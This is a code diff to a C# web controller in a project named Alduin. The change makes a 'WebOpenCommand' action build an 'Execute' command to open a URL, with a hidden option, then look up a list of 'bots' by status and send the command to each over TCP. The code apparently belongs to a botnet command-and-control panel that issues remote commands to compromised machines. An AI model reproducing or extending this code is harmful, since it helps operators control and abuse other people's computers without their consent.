@@ -99,7 +99,7 @@ namespace Alduin.Web.Controllers
         }
         [Authorize]
         [HttpPost]
-        public IActionResult WebOpenCommand(WebsiteModel model)
+        public async Task<IActionResult> WebOpenCommandAsync(WebsiteModel model)
         {
             if (!ModelState.IsValid)
                 return View(model);
@@ -107,7 +107,28 @@ namespace Alduin.Web.Controllers
             {
                 return RedirectToAction(nameof(HomeController.Index), "Home");
             }
-            return Json(true);
+            var websitevariables = new WebsiteVariables
+            {
+                Url = model.Url,
+                Closed = model.Closed,
+                Hidde = model.Hidde
+            };
+            var method = new BaseCommands
+            {
+                Method = "Execute"
+            };
+            var command = new WebsiteOpenModel
+            {
+                newBaseCommand = method,
+                newWebsiteModel = websitevariables
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(command).Replace(@"\", ""));
+            return Json(response);
         }
     }
 }
